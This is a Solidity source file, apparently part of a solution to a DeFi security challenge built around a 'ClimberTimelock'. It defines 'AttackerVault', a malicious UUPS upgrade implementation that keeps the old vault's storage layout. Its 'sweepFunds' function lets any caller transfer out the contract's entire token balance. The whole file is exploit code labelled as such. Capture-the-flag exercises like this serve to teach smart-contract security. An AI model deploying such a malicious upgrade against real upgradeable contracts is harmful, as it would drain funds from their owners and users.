// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// THIS CONTRACT IS TO EXPLOIT THE OLD VAULT

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./ClimberTimelock.sol";

/**
 * @title AttackerVault
 * @dev To be deployed behind a proxy following the UUPS pattern. Upgrades are to be triggered by the owner.
 * @author kaliberpoziomka
 */
contract AttackerVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    // Layout of variables must be consistent wiht old vault contract
    uint256 public constant WITHDRAWAL_LIMIT = 0 ether;
    uint256 public constant WAITING_PERIOD = 0 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    // comment below is necessary, without this upgrade is not possible
    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() initializer {}

    // Keep only necessary functions
    function initialize() initializer external {
        __Ownable_init();
        __UUPSUpgradeable_init();
    }

    // Simplified function to sweep all funds
    function sweepFunds(address tokenAddress) external {
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(msg.sender, token.balanceOf(address(this))), "Transfer failed");
    }

    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
}
